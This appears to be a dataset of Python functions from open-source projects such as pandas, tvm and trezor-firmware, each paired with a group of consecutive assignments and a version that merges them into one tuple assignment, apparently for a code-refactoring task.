ridx = MultiIndex.from_tuples([('A', 'a'), ('A', 'b'), ('B', 'c')])","cidx , ridx  = MultiIndex.from_tuples([('Z', 'a'), ('Z', 'b'), ('Y', 'c')]), MultiIndex.from_tuples([('A', 'a'), ('A', 'b'), ('B', 'c')])"
pandas,https://github.com/pandas-dev/pandas/tree/master/pandas/tests/io/formats/style/test_to_latex.py,,test_multi_options$335,"def test_multi_options(df_ext):
    cidx = MultiIndex.from_tuples([(""Z"", ""a""), (""Z"", ""b""), (""Y"", ""c"")])
    ridx = MultiIndex.from_tuples([(""A"", ""a""), (""A"", ""b""), (""B"", ""c"")])
    df_ext.index, df_ext.columns = ridx, cidx
    styler = df_ext.style.format(precision=2)

    expected = dedent(
        """"""\
     &  & \\multicolumn{2}{r}{Z} & Y \\\\
     &  & a & b & c \\\\
    \\multirow[c]{2}{*}{A} & a & 0 & -0.61 & ab \\\\
    """"""
    )
    result = styler.to_latex()
    assert expected in result

    with option_context(""styler.latex.multicol_align"", ""l""):
        assert "" &  & \\multicolumn{2}{l}{Z} & Y \\\\"" in styler.to_latex()

    with option_context(""styler.latex.multirow_align"", ""b""):
        assert ""\\multirow[b]{2}{*}{A} & a & 0 & -0.61 & ab \\\\"" in styler.to_latex()","expected = dedent('     &  & \\multicolumn{2}{r}{Z} & Y \\\\\n     &  & a & b & c \\\\\n    \\multirow[c]{2}{*}{A} & a & 0 & -0.61 & ab \\\\\n    ')
result = styler.to_latex()","expected , result  = dedent('     &  & \\multicolumn{2}{r}{Z} & Y \\\\\n     &  & a & b & c \\\\\n    \\multirow[c]{2}{*}{A} & a & 0 & -0.61 & ab \\\\\n    '), styler.to_latex()"
trezor-firmware,https://github.com/trezor/trezor-firmware/tree/master/core/src/apps/monero/xmr/bulletproof.py,KeyHadamardFoldedVct,__init__$916,"def __init__(
        self, src: KeyVBase, a: ScalarDst, b: ScalarDst, raw: bool = False, gc_fnc=None
    ):
        super().__init__(len(src) >> 1)
        self.src = src
        self.raw = raw
        self.gc_fnc = gc_fnc
        self.a = _load_scalar(None, a)
        self.b = _load_scalar(None, b)
        self.cur_pt = Point()
        self.tmp_pt = Point()
        self.cur = _ensure_dst_key() if not self.raw else None","self.src = src
self.raw = raw
self.gc_fnc = gc_fnc
self.a = _load_scalar(None, a)
self.b = _load_scalar(None, b)
self.cur_pt = Point()
self.tmp_pt = Point()","self.src , self.raw , self.gc_fnc , self.a , self.b , self.cur_pt , self.tmp_pt  = src, raw, gc_fnc, _load_scalar(None, a), _load_scalar(None, b), Point(), Point()"
abseil-py,https://github.com/abseil/abseil-py/tree/master/absl/testing/tests/absltest_test.py,TestCaseTest,test_xml_output_file_from_test_xmloutputdir_env$161,"def test_xml_output_file_from_test_xmloutputdir_env(self):
    xml_output_dir = tempfile.mkdtemp(dir=absltest.TEST_TMPDIR.value)
    expected_xml_file = 'absltest_test_helper.xml'
    self.run_helper(
        6,
        [],
        {'XML_OUTPUT_FILE': None,
         'RUNNING_UNDER_TEST_DAEMON': None,
         'TEST_XMLOUTPUTDIR': xml_output_dir,
         'ABSLTEST_TEST_HELPER_EXPECTED_XML_OUTPUT_FILE': os.path.join(
             xml_output_dir, expected_xml_file),
        },
        expect_success=True)","xml_output_dir = tempfile.mkdtemp(dir=absltest.TEST_TMPDIR.value)
expected_xml_file = 'absltest_test_helper.xml'","xml_output_dir , expected_xml_file  = tempfile.mkdtemp(dir=absltest.TEST_TMPDIR.value), 'absltest_test_helper.xml'"
pynndescent,https://github.com/lmcinnes/pynndescent/tree/master/pynndescent/optimal_transport.py,,update_flow$301,"def update_flow(join, leaving_arc_data, node_arc_data, spanning_tree, in_arc):
    source = node_arc_data.source
    target = node_arc_data.target
    flow = node_arc_data.flow

    state = spanning_tree.state
    pred = spanning_tree.pred
    parent = spanning_tree.parent
    forward = spanning_tree.forward

    # Augment along the cycle
    if leaving_arc_data.delta > 0:
        val = state[in_arc] * leaving_arc_data.delta
        flow[in_arc] += val
        u = source[in_arc]
        while u != join:
            if forward[u]:
                flow[pred[u]] -= val
            else:
                flow[pred[u]] += val

            u = parent[u]

        u = target[in_arc]
        while u != join:
            if forward[u]:
                flow[pred[u]] += val
            else:
                flow[pred[u]] -= val

            u = parent[u]

    # Update the state of the entering and leaving arcs
    if leaving_arc_data.change:
        state[in_arc] = ArcState.STATE_TREE
        if flow[pred[leaving_arc_data.u_out]] == 0:
            state[pred[leaving_arc_data.u_out]] = ArcState.STATE_LOWER
        else:
            state[pred[leaving_arc_data.u_out]] = ArcState.STATE_UPPER
    else:
        state[in_arc] = -state[in_arc]","source = node_arc_data.source
target = node_arc_data.target
flow = node_arc_data.flow
state = spanning_tree.state
pred = spanning_tree.pred
parent = spanning_tree.parent
forward = spanning_tree.forward","source , target , flow , state , pred , parent , forward  = node_arc_data.source, node_arc_data.target, node_arc_data.flow, spanning_tree.state, spanning_tree.pred, spanning_tree.parent, spanning_tree.forward"
tvm,https://github.com/apache/tvm/tree/master/tests/python/contrib/test_ethosu/test_tir_to_cs_translator.py,,test_assign_addresses$698,"def test_assign_addresses():
    test_cases = [
        {
            # Stimulus
            ""tir_module"": WeightStreamOnly,
            ""param_dict"": {
                WeightStreamOnly[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [128], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedRead,
            ""param_dict"": {
                MixedRead[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [592], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_8""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_9""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedConstantDatatypes,
            ""param_dict"": {
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""int16"").min, np.iinfo(""int16"").max, [1], ""int16""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [272], ""uint8""
                ),
            },
        },
    ]

    def extract_call_extern_list(mod):
        """"""This function will obtain all ethosu_conv2d
        calls from a NPU TIR module
        Parameters
        ----------
        mod : tvm.IRModule
            This is a NPU TIR Module

        Returns
        -------
        list
            of tvm.tir.Call objects
            that are tir extern calls
            for ethosu_conv2d
        """"""
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]

        extern_calls = list()

        def populate_extern_calls(stmt):
            if isinstance(stmt, tvm.tir.Call) and stmt.op.name == ""tir.call_extern"":
                extern_calls.append(stmt)

        stmt_functor.post_order_visit(primfunc.body, populate_extern_calls)
        return extern_calls

    def collect_tir_buffer_info(npu_ops):
        """"""This is run prior to address assigning to collect tir buffer information
        for verification later on""""""
        _npu_op_tir_buffers = dict()
        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                _npu_op_tir_buffers[npu_op] = (npu_op.src.address, npu_op.dest.address)
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                _npu_op_tir_buffers[npu_op] = (
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.weights,
                    npu_op.biases,
                )
        return _npu_op_tir_buffers

    def _check_buffer(address, region, length, buffer_var):
        """"""Checks whether the buffer information is valid with
        original tir buffers.
        - If its constant, this will check
          the slice in the constant tensor has the values.
        - If its scratch, this will check
          the slice is within scratch and does not have conflicts
          with other scratch tensors.
        - If its input/output, this will check the
          address is zero
        """"""
        inverse_region_map = {
            0: tir_to_cs_translator.BufferType.constant,
            1: tir_to_cs_translator.BufferType.scratch,
            3: tir_to_cs_translator.BufferType.input,
            4: tir_to_cs_translator.BufferType.output,
        }
        buffer_type = inverse_region_map[region]
        buffer_dtype = buffer_var.type_annotation.element_type.dtype
        dtype_bytes = np.iinfo(np.dtype(buffer_dtype)).bits // 8
        if buffer_type == tir_to_cs_translator.BufferType.constant:
            ref = buffer_info[buffer_var].values
            hex_from = address * dtype_bytes * 2
            hex_to = hex_from + length * dtype_bytes * 2
            constant_hex = constant_hex_string[hex_from:hex_to]
            constant_tensor = np.frombuffer(bytearray.fromhex(constant_hex), dtype=buffer_dtype)
            np.array_equal(constant_tensor, ref)
            # Every buffer is adjusted to align to 16 bytes
            length = util.round_up(length, 16)
            # Mark these constants are read at least once
            constant_tensor_read_mask[address : address + length] = np.ones(
                length, dtype=buffer_dtype
            )
        elif buffer_type == tir_to_cs_translator.BufferType.scratch:
            assert address < tvmbaw_workspace_size

            size_in_bytes = allocate_node_sizes[buffer_var]
            # Every buffer is adjusted to align to 16 bytes
            size_in_bytes = util.round_up(size_in_bytes, 16)
            assert address + size_in_bytes <= tvmbaw_workspace_size
            # The scratch area should not be used by any other buffer
            assert not tvmbaw_workspace_mask[address : address + size_in_bytes].any()
            # The scratch area is marked as used
            tvmbaw_workspace_mask[address : address + size_in_bytes] = np.ones(
                size_in_bytes, dtype=""uint8""
            )
        elif buffer_type == tir_to_cs_translator.BufferType.input:
            assert address == 0
        else:
            assert buffer_type == tir_to_cs_translator.BufferType.output
            assert address == 0

    def _get_allocate_node_sizes(mod):
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]
        _allocate_node_sizes = dict()

        def analyze_remaining_allocates(stmt):
            if isinstance(stmt, tvm.tir.stmt.Allocate):
                allocate = stmt
                pointer_type = allocate.buffer_var.type_annotation
                storage_scope = pointer_type.storage_scope
                if storage_scope == ""global"":
                    dtype_bytes = np.iinfo(np.dtype(allocate.dtype)).bits // 8
                    size_in_bytes = int(dtype_bytes * np.prod(list(allocate.extents)))
                    # Every memory address the NPU access have to be 16 byte aligned
                    size_in_bytes = util.round_up(size_in_bytes, 16)
                    _allocate_node_sizes[allocate.buffer_var] = size_in_bytes

        tvm.tir.stmt_functor.post_order_visit(primfunc.body, analyze_remaining_allocates)
        return _allocate_node_sizes

    def verify(npu_ops):
        """"""This wrapper verifies the allocated addresses matches with original tir buffers""""""
        checked_buffers = set()

        def check_buffer(address, region, length, buffer_var):
            if buffer_var not in checked_buffers:
                _check_buffer(address, region, length, buffer_var)
                checked_buffers.add(buffer_var)

        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                src_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                check_buffer(
                    npu_op.src.address, npu_op.src.region, npu_op.src.length, src_tir_buffer_var
                )
                dest_tir_load = npu_op_tir_buffers[npu_op][1].buffer.data
                check_buffer(
                    npu_op.dest.address,
                    npu_op.dest.region,
                    npu_op.dest.length,
                    dest_tir_load,
                )
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                ifm_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                ifm_length = (
                    npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth
                )
                check_buffer(
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ifm.region,
                    ifm_length,
                    ifm_tir_buffer_var,
                )
                ofm_tir_buffer_var = npu_op_tir_buffers[npu_op][1].buffer.data
                ofm_length = (
                    npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth
                )
                check_buffer(
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.ofm.region,
                    ofm_length,
                    ofm_tir_buffer_var,
                )
                for idx, weight in enumerate(npu_op_tir_buffers[npu_op][2]):
                    assert isinstance(weight, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.weights[idx].address,
                        npu_op.weights[idx].region,
                        npu_op.weights[idx].length,
                        weight.address.buffer.data,
                    )
                for idx, bias in enumerate(npu_op_tir_buffers[npu_op][3]):
                    assert isinstance(bias, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.biases[idx].address,
                        npu_op.biases[idx].region,
                        npu_op.biases[idx].length,
                        bias.address.buffer.data,
                    )

    for test_case in test_cases:
        tir_mod = test_case[""tir_module""]
        tir_mod[""main""] = tir_mod[""main""].with_attr(""target"", tvm.target.Target(""ethos-u""))
        tir_mod = tvm.tir.transform.MakeUnpackedAPI()(tir_mod)
        candidate_regions_for_scratch = [5, 2, 1]
        (
            scratch_region_map,
            tvmbaw_workspace_size,
            _,
        ) = tir_to_cs_translator.analyze_scratch_memory_acesses(
            tir_mod, candidate_regions_for_scratch
        )
        allocate_node_sizes = _get_allocate_node_sizes(tir_mod)
        buffer_info = tir_to_cs_translator.extract_buffer_info(tir_mod, test_case[""param_dict""])
        extern_calls = extract_call_extern_list(tir_mod)
        _npu_ops = list()
        for extern_call in extern_calls:
            _npu_ops.append(tir_to_cs_translator.translate_ethosu_tir_call_extern(extern_call))
        npu_op_tir_buffers = collect_tir_buffer_info(_npu_ops)
        (_npu_ops, constant_hex_string) = tir_to_cs_translator.assign_addresses(
            buffer_info, _npu_ops, scratch_region_map
        )
        tvmbaw_workspace_mask = np.zeros(tvmbaw_workspace_size, dtype=""uint8"")
        constant_tensor_read_mask = np.zeros(len(constant_hex_string) // 2, dtype=""uint8"")
        verify(_npu_ops)
        # This will be only 1 if all allocated scratch is used.
        assert np.prod(tvmbaw_workspace_mask) == 1
        # This will be only 1 if all constant tensors is read at least once.
        assert np.prod(constant_tensor_read_mask) == 1","primfunc = mod.functions.items()[0][1]
extern_calls = list()","primfunc , extern_calls  = mod.functions.items()[0][1], list()"
tvm,https://github.com/apache/tvm/tree/master/tests/python/contrib/test_ethosu/test_tir_to_cs_translator.py,,test_assign_addresses$698,"def test_assign_addresses():
    test_cases = [
        {
            # Stimulus
            ""tir_module"": WeightStreamOnly,
            ""param_dict"": {
                WeightStreamOnly[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [128], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedRead,
            ""param_dict"": {
                MixedRead[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [592], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_8""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_9""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedConstantDatatypes,
            ""param_dict"": {
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""int16"").min, np.iinfo(""int16"").max, [1], ""int16""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [272], ""uint8""
                ),
            },
        },
    ]

    def extract_call_extern_list(mod):
        """"""This function will obtain all ethosu_conv2d
        calls from a NPU TIR module
        Parameters
        ----------
        mod : tvm.IRModule
            This is a NPU TIR Module

        Returns
        -------
        list
            of tvm.tir.Call objects
            that are tir extern calls
            for ethosu_conv2d
        """"""
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]

        extern_calls = list()

        def populate_extern_calls(stmt):
            if isinstance(stmt, tvm.tir.Call) and stmt.op.name == ""tir.call_extern"":
                extern_calls.append(stmt)

        stmt_functor.post_order_visit(primfunc.body, populate_extern_calls)
        return extern_calls

    def collect_tir_buffer_info(npu_ops):
        """"""This is run prior to address assigning to collect tir buffer information
        for verification later on""""""
        _npu_op_tir_buffers = dict()
        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                _npu_op_tir_buffers[npu_op] = (npu_op.src.address, npu_op.dest.address)
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                _npu_op_tir_buffers[npu_op] = (
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.weights,
                    npu_op.biases,
                )
        return _npu_op_tir_buffers

    def _check_buffer(address, region, length, buffer_var):
        """"""Checks whether the buffer information is valid with
        original tir buffers.
        - If its constant, this will check
          the slice in the constant tensor has the values.
        - If its scratch, this will check
          the slice is within scratch and does not have conflicts
          with other scratch tensors.
        - If its input/output, this will check the
          address is zero
        """"""
        inverse_region_map = {
            0: tir_to_cs_translator.BufferType.constant,
            1: tir_to_cs_translator.BufferType.scratch,
            3: tir_to_cs_translator.BufferType.input,
            4: tir_to_cs_translator.BufferType.output,
        }
        buffer_type = inverse_region_map[region]
        buffer_dtype = buffer_var.type_annotation.element_type.dtype
        dtype_bytes = np.iinfo(np.dtype(buffer_dtype)).bits // 8
        if buffer_type == tir_to_cs_translator.BufferType.constant:
            ref = buffer_info[buffer_var].values
            hex_from = address * dtype_bytes * 2
            hex_to = hex_from + length * dtype_bytes * 2
            constant_hex = constant_hex_string[hex_from:hex_to]
            constant_tensor = np.frombuffer(bytearray.fromhex(constant_hex), dtype=buffer_dtype)
            np.array_equal(constant_tensor, ref)
            # Every buffer is adjusted to align to 16 bytes
            length = util.round_up(length, 16)
            # Mark these constants are read at least once
            constant_tensor_read_mask[address : address + length] = np.ones(
                length, dtype=buffer_dtype
            )
        elif buffer_type == tir_to_cs_translator.BufferType.scratch:
            assert address < tvmbaw_workspace_size

            size_in_bytes = allocate_node_sizes[buffer_var]
            # Every buffer is adjusted to align to 16 bytes
            size_in_bytes = util.round_up(size_in_bytes, 16)
            assert address + size_in_bytes <= tvmbaw_workspace_size
            # The scratch area should not be used by any other buffer
            assert not tvmbaw_workspace_mask[address : address + size_in_bytes].any()
            # The scratch area is marked as used
            tvmbaw_workspace_mask[address : address + size_in_bytes] = np.ones(
                size_in_bytes, dtype=""uint8""
            )
        elif buffer_type == tir_to_cs_translator.BufferType.input:
            assert address == 0
        else:
            assert buffer_type == tir_to_cs_translator.BufferType.output
            assert address == 0

    def _get_allocate_node_sizes(mod):
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]
        _allocate_node_sizes = dict()

        def analyze_remaining_allocates(stmt):
            if isinstance(stmt, tvm.tir.stmt.Allocate):
                allocate = stmt
                pointer_type = allocate.buffer_var.type_annotation
                storage_scope = pointer_type.storage_scope
                if storage_scope == ""global"":
                    dtype_bytes = np.iinfo(np.dtype(allocate.dtype)).bits // 8
                    size_in_bytes = int(dtype_bytes * np.prod(list(allocate.extents)))
                    # Every memory address the NPU access have to be 16 byte aligned
                    size_in_bytes = util.round_up(size_in_bytes, 16)
                    _allocate_node_sizes[allocate.buffer_var] = size_in_bytes

        tvm.tir.stmt_functor.post_order_visit(primfunc.body, analyze_remaining_allocates)
        return _allocate_node_sizes

    def verify(npu_ops):
        """"""This wrapper verifies the allocated addresses matches with original tir buffers""""""
        checked_buffers = set()

        def check_buffer(address, region, length, buffer_var):
            if buffer_var not in checked_buffers:
                _check_buffer(address, region, length, buffer_var)
                checked_buffers.add(buffer_var)

        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                src_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                check_buffer(
                    npu_op.src.address, npu_op.src.region, npu_op.src.length, src_tir_buffer_var
                )
                dest_tir_load = npu_op_tir_buffers[npu_op][1].buffer.data
                check_buffer(
                    npu_op.dest.address,
                    npu_op.dest.region,
                    npu_op.dest.length,
                    dest_tir_load,
                )
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                ifm_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                ifm_length = (
                    npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth
                )
                check_buffer(
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ifm.region,
                    ifm_length,
                    ifm_tir_buffer_var,
                )
                ofm_tir_buffer_var = npu_op_tir_buffers[npu_op][1].buffer.data
                ofm_length = (
                    npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth
                )
                check_buffer(
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.ofm.region,
                    ofm_length,
                    ofm_tir_buffer_var,
                )
                for idx, weight in enumerate(npu_op_tir_buffers[npu_op][2]):
                    assert isinstance(weight, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.weights[idx].address,
                        npu_op.weights[idx].region,
                        npu_op.weights[idx].length,
                        weight.address.buffer.data,
                    )
                for idx, bias in enumerate(npu_op_tir_buffers[npu_op][3]):
                    assert isinstance(bias, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.biases[idx].address,
                        npu_op.biases[idx].region,
                        npu_op.biases[idx].length,
                        bias.address.buffer.data,
                    )

    for test_case in test_cases:
        tir_mod = test_case[""tir_module""]
        tir_mod[""main""] = tir_mod[""main""].with_attr(""target"", tvm.target.Target(""ethos-u""))
        tir_mod = tvm.tir.transform.MakeUnpackedAPI()(tir_mod)
        candidate_regions_for_scratch = [5, 2, 1]
        (
            scratch_region_map,
            tvmbaw_workspace_size,
            _,
        ) = tir_to_cs_translator.analyze_scratch_memory_acesses(
            tir_mod, candidate_regions_for_scratch
        )
        allocate_node_sizes = _get_allocate_node_sizes(tir_mod)
        buffer_info = tir_to_cs_translator.extract_buffer_info(tir_mod, test_case[""param_dict""])
        extern_calls = extract_call_extern_list(tir_mod)
        _npu_ops = list()
        for extern_call in extern_calls:
            _npu_ops.append(tir_to_cs_translator.translate_ethosu_tir_call_extern(extern_call))
        npu_op_tir_buffers = collect_tir_buffer_info(_npu_ops)
        (_npu_ops, constant_hex_string) = tir_to_cs_translator.assign_addresses(
            buffer_info, _npu_ops, scratch_region_map
        )
        tvmbaw_workspace_mask = np.zeros(tvmbaw_workspace_size, dtype=""uint8"")
        constant_tensor_read_mask = np.zeros(len(constant_hex_string) // 2, dtype=""uint8"")
        verify(_npu_ops)
        # This will be only 1 if all allocated scratch is used.
        assert np.prod(tvmbaw_workspace_mask) == 1
        # This will be only 1 if all constant tensors is read at least once.
        assert np.prod(constant_tensor_read_mask) == 1","buffer_type = inverse_region_map[region]
buffer_dtype = buffer_var.type_annotation.element_type.dtype","buffer_type , buffer_dtype  = inverse_region_map[region], buffer_var.type_annotation.element_type.dtype"
tvm,https://github.com/apache/tvm/tree/master/tests/python/contrib/test_ethosu/test_tir_to_cs_translator.py,,test_assign_addresses$698,"def test_assign_addresses():
    test_cases = [
        {
            # Stimulus
            ""tir_module"": WeightStreamOnly,
            ""param_dict"": {
                WeightStreamOnly[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [128], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedRead,
            ""param_dict"": {
                MixedRead[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [592], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
